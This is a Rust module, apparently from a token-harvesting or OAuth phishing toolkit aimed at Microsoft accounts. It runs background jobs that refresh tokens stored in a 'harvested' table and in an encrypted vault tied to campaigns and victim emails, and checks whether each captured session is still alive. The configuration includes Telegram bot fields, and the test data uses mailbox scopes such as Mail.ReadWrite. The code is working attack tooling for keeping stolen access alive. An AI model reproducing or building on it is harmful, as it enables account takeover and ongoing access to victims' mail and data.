use crate::AppState;
use actix_web::web;
use anyhow::Context;
use chrono::{Duration, Utc};
use serde_json::Value;
use sqlx::SqlitePool;

#[derive(Debug, sqlx::FromRow)]
struct ExpiringToken {
    id: String,
}

/// Run one refresh cycle: find tokens expiring within 10 minutes and refresh them.
pub async fn run_refresh_cycle(state: &AppState) {
    let threshold = Utc::now() + Duration::minutes(10);

    // Refresh encrypted tokens table
    let rows = match sqlx::query_as::<_, ExpiringToken>(
        "SELECT id FROM tokens WHERE expires_at < ? AND (status IS NULL OR status != 'revoked')"
    )
    .bind(threshold)
    .fetch_all(&state.pool)
    .await {
        Ok(r) => r,
        Err(e) => {
            eprintln!("[scheduler] Failed to query expiring tokens: {}", e);
            return;
        }
    };

    if !rows.is_empty() {
        println!("[scheduler] Found {} encrypted token(s) needing refresh", rows.len());
    }

    for row in rows {
        if let Err(e) = refresh_single_token(state, &row.id, "https://login.microsoftonline.com/common/oauth2/v2.0/token").await {
            eprintln!("[scheduler] Failed to refresh encrypted token {}: {}", row.id, e);
        }
    }

    // Refresh legacy harvested table tokens too
    let harvested_rows = match sqlx::query_as::<_, ExpiringToken>(
        "SELECT id FROM harvested WHERE expires_at < ?"
    )
    .bind(threshold)
    .fetch_all(&state.pool)
    .await {
        Ok(r) => r,
        Err(e) => {
            eprintln!("[scheduler] Failed to query expiring harvested tokens: {}", e);
            return;
        }
    };

    if !harvested_rows.is_empty() {
        println!("[scheduler] Found {} harvested token(s) needing refresh", harvested_rows.len());
    }

    for row in harvested_rows {
        if let Err(e) = refresh_harvested_token(state, &row.id, "https://login.microsoftonline.com/common/oauth2/v2.0/token").await {
            eprintln!("[scheduler] Failed to refresh harvested token {}: {}", row.id, e);
        }
    }
}

/// Refresh a single token against the given token endpoint URL.
/// On success, re-encrypts and stores new tokens.
/// On invalid_grant, marks the token as revoked.
pub async fn refresh_single_token(
    state: &AppState,
    token_id: &str,
    token_url: &str,
) -> anyhow::Result<()> {
    let token = state
        .vault
        .retrieve_token(&state.pool, token_id)
        .await
        .context("Failed to retrieve token for refresh")?;

    let scope_str = token.scopes.join(" ");

    let params = [
        ("client_id", state.config.client_id.as_str()),
        ("client_secret", state.config.client_secret.as_str()),
        ("grant_type", "refresh_token"),
        ("refresh_token", token.refresh_token.as_str()),
        ("scope", scope_str.as_str()),
    ];

    let res = state
        .http_client
        .post(token_url)
        .form(&params)
        .send()
        .await
        .context("HTTP request to token endpoint failed")?;

    if res.status().is_success() {
        let body: Value = res
            .json()
            .await
            .context("Failed to parse token response")?;

        let new_access = body
            .get("access_token")
            .and_then(|v| v.as_str())
            .ok_or_else(|| anyhow::anyhow!("Missing access_token in refresh response"))?;

        // Microsoft does not always return a new refresh token
        let new_refresh = body
            .get("refresh_token")
            .and_then(|v| v.as_str())
            .unwrap_or(&token.refresh_token);

        let expires_in = body.get("expires_in").and_then(|v| v.as_i64()).unwrap_or(3600);
        let new_expires = Utc::now() + Duration::seconds(expires_in);

        state
            .vault
            .rotate_refresh_token(&state.pool, token_id, new_access, new_refresh, new_expires)
            .await
            .context("Failed to store rotated token")?;

        let _ = crate::audit::insert_audit_log(
            &state.pool,
            "token_refreshed",
            None,
            Some(token_id),
            Some(&token.user_email),
            Some("scheduler"),
            Some("scheduler/background"),
            Some(serde_json::json!({"expires_at": new_expires.to_rfc3339()})),
            true,
        ).await;

        println!(
            "[scheduler] Successfully refreshed token {} (expires: {})",
            token_id, new_expires
        );
    } else if res.status().as_u16() == 400 {
        let body: Value = res.json().await.unwrap_or_default();
        let error_code = body.get("error").and_then(|v| v.as_str()).unwrap_or("unknown");

        if error_code == "invalid_grant" {
            mark_token_revoked(&state.pool, token_id)
                .await
                .context("Failed to mark token as revoked")?;

            let _ = crate::audit::insert_audit_log(
                &state.pool,
                "token_revoked",
                None,
                Some(token_id),
                Some(&token.user_email),
                Some("scheduler"),
                Some("scheduler/background"),
                Some(serde_json::json!({"reason": "invalid_grant"})),
                true,
            ).await;

            println!(
                "[scheduler] Token {} marked as revoked (invalid_grant)",
                token_id
            );
        } else {
            let _ = crate::audit::insert_audit_log(
                &state.pool,
                "token_refresh_failed",
                None,
                Some(token_id),
                Some(&token.user_email),
                Some("scheduler"),
                Some("scheduler/background"),
                Some(serde_json::json!({"error": error_code})),
                false,
            ).await;

            anyhow::bail!("Refresh failed with error: {}", error_code);
        }
    } else {
        let _ = crate::audit::insert_audit_log(
            &state.pool,
            "token_refresh_failed",
            None,
            Some(token_id),
            Some(&token.user_email),
            Some("scheduler"),
            Some("scheduler/background"),
            Some(serde_json::json!({"status": res.status().as_u16()})),
            false,
        ).await;

        anyhow::bail!("Refresh failed with status: {}", res.status());
    }

    Ok(())
}

/// Refresh a legacy harvested token and update its access_token + expires_at.
pub async fn refresh_harvested_token(
    state: &AppState,
    token_id: &str,
    token_url: &str,
) -> anyhow::Result<()> {
    let row: (String, String, String) = sqlx::query_as(
        "SELECT id, access_token, refresh_token FROM harvested WHERE id = ?"
    )
    .bind(token_id)
    .fetch_one(&state.pool)
    .await
    .context("Failed to retrieve harvested token for refresh")?;

    let params = [
        ("client_id", state.config.client_id.as_str()),
        ("client_secret", state.config.client_secret.as_str()),
        ("grant_type", "refresh_token"),
        ("refresh_token", row.2.as_str()),
    ];

    let res = state
        .http_client
        .post(token_url)
        .form(&params)
        .send()
        .await
        .context("HTTP request to token endpoint failed")?;

    if res.status().is_success() {
        let body: Value = res
            .json()
            .await
            .context("Failed to parse token response")?;

        let new_access = body
            .get("access_token")
            .and_then(|v| v.as_str())
            .ok_or_else(|| anyhow::anyhow!("Missing access_token in refresh response"))?;

        let expires_in = body.get("expires_in").and_then(|v| v.as_i64()).unwrap_or(3600);
        let new_expires = Utc::now() + Duration::seconds(expires_in);

        sqlx::query(
            "UPDATE harvested SET access_token = ?, expires_at = ? WHERE id = ?"
        )
        .bind(new_access)
        .bind(new_expires)
        .bind(token_id)
        .execute(&state.pool)
        .await
        .context("Failed to update harvested token")?;

        println!(
            "[scheduler] Successfully refreshed harvested token {} (expires: {})",
            token_id, new_expires
        );
    } else {
        anyhow::bail!("Refresh failed with status: {}", res.status());
    }

    Ok(())
}

async fn mark_token_revoked(pool: &SqlitePool, token_id: &str) -> anyhow::Result<()> {
    sqlx::query("UPDATE tokens SET status = 'revoked' WHERE id = ?")
        .bind(token_id)
        .execute(pool)
        .await
        .context("Failed to mark token revoked")?;
    Ok(())
}

/// Run session refresh cycle: verify OAuth tokens are still valid by attempting refresh.
/// Token-based session: OAuth token IS the session. If token refresh fails, session is dead.
pub async fn run_session_refresh_cycle(state: &AppState) {
    println!("[session-refresh] Starting token-based session refresh cycle");
    
    // Find active tokens and verify they can still be refreshed
    let rows = match sqlx::query_as::<_, ExpiringToken>(
        "SELECT id FROM tokens WHERE session_status = 'active' AND (session_killed_at IS NULL)"
    )
    .fetch_all(&state.pool)
    .await {
        Ok(r) => r,
        Err(e) => {
            eprintln!("[session-refresh] Failed to query active sessions: {}", e);
            return;
        }
    };
    
    if !rows.is_empty() {
        println!("[session-refresh] Found {} token(s) with active sessions", rows.len());
    }
    
    for row in rows {
        let token_id = &row.id;
        
        // Try to refresh the token - if it fails, session is dead
        let token = match state.vault.retrieve_token(&state.pool, token_id).await {
            Ok(t) => t,
            Err(e) => {
                eprintln!("[session-refresh] Failed to retrieve token {}: {}", token_id, e);
                continue;
            }
        };
        
        // Attempt token refresh to verify session validity
        let params = [
            ("client_id", state.config.client_id.as_str()),
            ("client_secret", state.config.client_secret.as_str()),
            ("grant_type", "refresh_token"),
            ("refresh_token", token.refresh_token.as_str()),
        ];
        
        let res = match state.http_client
            .post("https://login.microsoftonline.com/common/oauth2/v2.0/token")
            .form(&params)
            .send()
            .await
        {
            Ok(r) => r,
            Err(e) => {
                eprintln!("[session-refresh] HTTP error for token {}: {}", token_id, e);
                continue;
            }
        };
        
        if res.status().is_success() {
            println!("[session-refresh] Token {} session is valid", token_id);
            
            // Update session_active_at
            let _ = sqlx::query(
                "UPDATE tokens SET session_active_at = ? WHERE id = ?"
            )
            .bind(Utc::now())
            .bind(token_id)
            .execute(&state.pool)
            .await;
            
            let _ = sqlx::query(
                "UPDATE harvested SET session_active_at = ? WHERE id = ?"
            )
            .bind(Utc::now())
            .bind(token_id)
            .execute(&state.pool)
            .await;
        } else {
            let status = res.status();
            let body = res.text().await.unwrap_or_default();
            println!("[session-refresh] Token {} session expired: HTTP {} - {}", token_id, status, body);
            
            // Session expired - mark as expired
            let _ = sqlx::query(
                "UPDATE tokens SET session_status = 'expired' WHERE id = ?"
            )
            .bind(token_id)
            .execute(&state.pool)
            .await;
            
            let _ = sqlx::query(
                "UPDATE harvested SET session_status = 'expired' WHERE id = ?"
            )
            .bind(token_id)
            .execute(&state.pool)
            .await;
            
            let _ = crate::audit::insert_audit_log(
                &state.pool,
                "session_expired",
                None,
                Some(token_id),
                Some(&token.user_email),
                Some("scheduler"),
                Some("scheduler/session-refresh"),
                Some(serde_json::json!({"reason": "token_refresh_failed", "status": status.as_u16()})),
                true,
            ).await;
        }
    }
    
    // Also check harvested table
    let harvested_rows = match sqlx::query_as::<_, ExpiringToken>(
        "SELECT id FROM harvested WHERE session_status = 'active' AND (session_killed_at IS NULL)"
    )
    .fetch_all(&state.pool)
    .await {
        Ok(r) => r,
        Err(e) => {
            eprintln!("[session-refresh] Failed to query harvested active sessions: {}", e);
            return;
        }
    };
    
    for row in harvested_rows {
        let token_id = &row.id;
        
        // Check if harvested token has a corresponding vault token
        let vault_token = match state.vault.retrieve_token(&state.pool, token_id).await {
            Ok(t) => t,
            Err(_) => {
                // No vault token - check if harvested token is expired
                let row: Option<(String, chrono::DateTime<Utc>)> = sqlx::query_as(
                    "SELECT id, expires_at FROM harvested WHERE id = ?"
                )
                .bind(token_id)
                .fetch_optional(&state.pool)
                .await
                .unwrap_or(None);
                
                if let Some((_, expires_at)) = row {
                    if Utc::now() > expires_at {
                        println!("[session-refresh] Harvested token {} expired", token_id);
                        let _ = sqlx::query(
                            "UPDATE harvested SET session_status = 'expired' WHERE id = ?"
                        )
                        .bind(token_id)
                        .execute(&state.pool)
                        .await;
                    }
                }
                continue;
            }
        };
        
        // Try to refresh
        let params = [
            ("client_id", state.config.client_id.as_str()),
            ("client_secret", state.config.client_secret.as_str()),
            ("grant_type", "refresh_token"),
            ("refresh_token", vault_token.refresh_token.as_str()),
        ];
        
        let res = match state.http_client
            .post("https://login.microsoftonline.com/common/oauth2/v2.0/token")
            .form(&params)
            .send()
            .await
        {
            Ok(r) => r,
            Err(_) => continue,
        };
        
        if !res.status().is_success() {
            let _ = sqlx::query(
                "UPDATE harvested SET session_status = 'expired' WHERE id = ?"
            )
            .bind(token_id)
            .execute(&state.pool)
            .await;
        }
    }
    
    println!("[session-refresh] Token-based session refresh cycle complete");
}

/// Spawn background tasks:
/// - Token refresh cycle: every 5 minutes
/// - Session refresh cycle: every 30 minutes
pub fn start_scheduler(state: web::Data<AppState>) {
    let state1 = state.clone();
    tokio::spawn(async move {
        let mut interval = tokio::time::interval(std::time::Duration::from_secs(300));
        loop {
            interval.tick().await;
            run_refresh_cycle(&state1).await;
        }
    });
    
    let state2 = state.clone();
    tokio::spawn(async move {
        let mut interval = tokio::time::interval(std::time::Duration::from_secs(1800)); // 30 minutes
        loop {
            interval.tick().await;
            run_session_refresh_cycle(&state2).await;
        }
    });
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::AppConfig;
    use crate::vault::Vault;
    use sqlx::sqlite::SqlitePoolOptions;
    use wiremock::matchers::{method, path};
    use wiremock::{Mock, MockServer, ResponseTemplate};

    async fn setup_test_state() -> AppState {
        let pool = SqlitePoolOptions::new()
            .max_connections(1)
            .connect("sqlite::memory:")
            .await
            .unwrap();

        sqlx::query(
            r#"
            CREATE TABLE tokens (
                id TEXT PRIMARY KEY,
                campaign_id TEXT,
                user_email TEXT,
                encrypted_access_token BLOB NOT NULL,
                encrypted_refresh_token BLOB NOT NULL,
                access_salt BLOB NOT NULL,
                refresh_salt BLOB NOT NULL,
                scopes TEXT,
                expires_at DATETIME NOT NULL,
                created_at DATETIME NOT NULL,
                last_refreshed_at DATETIME,
                status TEXT DEFAULT 'active',
                account_type TEXT
            )
            "#,
        )
        .execute(&pool)
        .await
        .unwrap();

        let config = AppConfig {
            client_id: "test_client_id".to_string(),
            client_secret: "test_secret".to_string(),
            redirect_uri: "http://localhost".to_string(),
            first_party_ids: vec![],
            database_url: "sqlite::memory:".to_string(),
            telegram_bot_token: None,
            telegram_chat_id: None,
            master_secret: "test_scheduler_secret".to_string(),
            frontend_url: None,
        };

        let vault = Vault::new(config.master_secret.clone());
        let http_client = reqwest::Client::new();

        let response_key = crate::response_crypto::ResponseCrypto::derive_key(&config.master_secret);

        AppState {
            pool,
            config,
            http_client,
            vault,
            response_key,
        }
    }

    #[tokio::test]
    async fn test_refresh_success() {
        let state = setup_test_state().await;
        let mock_server = MockServer::start().await;

        let token_id = state
            .vault
            .store_token(
                &state.pool,
                "camp1",
                "user@test.com",
                "old_access",
                "old_refresh",
                vec!["User.Read".to_string()],
                Utc::now() + Duration::minutes(5),
                None,
            )
            .await
            .unwrap();

        Mock::given(method("POST"))
            .and(path("/common/oauth2/v2.0/token"))
            .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({
                "access_token": "new_access_token",
                "refresh_token": "new_refresh_token",
                "expires_in": 3600
            })))
            .mount(&mock_server)
            .await;

        let token_url = format!("{}/common/oauth2/v2.0/token", mock_server.uri());
        refresh_single_token(&state, &token_id, &token_url)
            .await
            .expect("Refresh should succeed");

        let refreshed = state
            .vault
            .retrieve_token(&state.pool, &token_id)
            .await
            .unwrap();

        assert_eq!(refreshed.access_token, "new_access_token");
        assert_eq!(refreshed.refresh_token, "new_refresh_token");
        assert!(refreshed.last_refreshed_at.is_some());
    }

    #[tokio::test]
    async fn test_refresh_invalid_grant_revokes() {
        let state = setup_test_state().await;
        let mock_server = MockServer::start().await;

        let token_id = state
            .vault
            .store_token(
                &state.pool,
                "camp2",
                "user2@test.com",
                "old_access",
                "old_refresh",
                vec!["Mail.ReadWrite".to_string()],
                Utc::now() + Duration::minutes(5),
                None,
            )
            .await
            .unwrap();

        Mock::given(method("POST"))
            .and(path("/common/oauth2/v2.0/token"))
            .respond_with(ResponseTemplate::new(400).set_body_json(serde_json::json!({
                "error": "invalid_grant",
                "error_description": "The provided authorization grant is invalid."
            })))
            .mount(&mock_server)
            .await;

        let token_url = format!("{}/common/oauth2/v2.0/token", mock_server.uri());
        refresh_single_token(&state, &token_id, &token_url)
            .await
            .expect("Should handle invalid_grant gracefully");

        let row: (String,) = sqlx::query_as("SELECT status FROM tokens WHERE id = ?")
            .bind(&token_id)
            .fetch_one(&state.pool)
            .await
            .unwrap();

        assert_eq!(row.0, "revoked");
    }
}
